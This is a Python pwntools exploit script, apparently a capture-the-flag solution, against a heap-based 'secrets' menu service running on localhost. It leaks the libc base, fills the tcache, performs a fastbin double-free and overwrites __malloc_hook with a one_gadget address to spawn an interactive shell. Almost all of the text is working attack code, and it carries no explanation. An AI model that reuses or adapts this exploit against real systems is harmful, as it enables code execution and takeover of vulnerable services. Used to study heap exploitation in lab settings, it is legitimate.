from pwn import *
from binascii import unhexlify

HOST = "localhost"
PORT = 9000

LIBC_PATH = "../attachments/libc-2.31.so"
LIBC_OG_OFFSET = 0xe3afe

def _recv_then_send(r, data: bytes, prompt: bytes):
	r.recvuntil(prompt)
	r.sendline(data)
	
def _itob(index: int):
	return bytes([index+0x30])

def send_index(r, index: int):
	_recv_then_send(r, _itob(index), b"Secret index: ")
	
def send_content(r, content: bytes):
	_recv_then_send(r, content, b"Secret content: ")

def send_choice(r, choice: int):
	_recv_then_send(r, _itob(choice), b"Your choice: ")
	
def create_new_secret(r, content: bytes):
	send_choice(r, 1)
	send_content(r, content)
	
def read_secret(r, index: int) -> bytes:
	send_choice(r, 2)
	send_index(r, index)
	return r.recvline()[5:]
	
def update_secret(r, index: int, content: bytes):
	send_choice(r, 3)
	send_index(r, index)
	send_content(r, content)
	
def delete_secret(r, index: int):
	send_choice(r, 4)
	send_index(r, index)
	
def about_libc_leak(r):
	send_choice(r, 9)
	libc_base_line = bytes()
	while b"libc-" not in libc_base_line:
		libc_base_line = r.recvline()
	return libc_base_line.split(b"-", 1)[0]


r = remote(HOST, PORT)
libc = about_libc_leak(r)

# Leak libc base and free_hook addresses
l = ELF(LIBC_PATH)
l.address = int.from_bytes(unhexlify(libc), "big")
print(f"malloc hook is at {hex(l.sym['__malloc_hook'])}")

# Fill up tcache via index 0
create_new_secret(r, b"-")
for _ in range(7):
	update_secret(r, 0, b"-")
	delete_secret(r, 0)

# Create new chunks
create_new_secret(r, b"1")  # index at =1
create_new_secret(r, b"2")
create_new_secret(r, b"3")

# Fastbin dup
delete_secret(r, 1)
delete_secret(r, 2)
delete_secret(r, 1)

# Target malloc hook fake chunk
update_secret(r, 1, p64(l.sym['__malloc_hook']-51))
create_new_secret(r, b"2")
create_new_secret(r, b"1")
create_new_secret(r, b"A"*35 + p64(l.address + LIBC_OG_OFFSET))

# Perform self-test to initiate shell with appropriate params
send_choice(r, 5)
r.interactive()

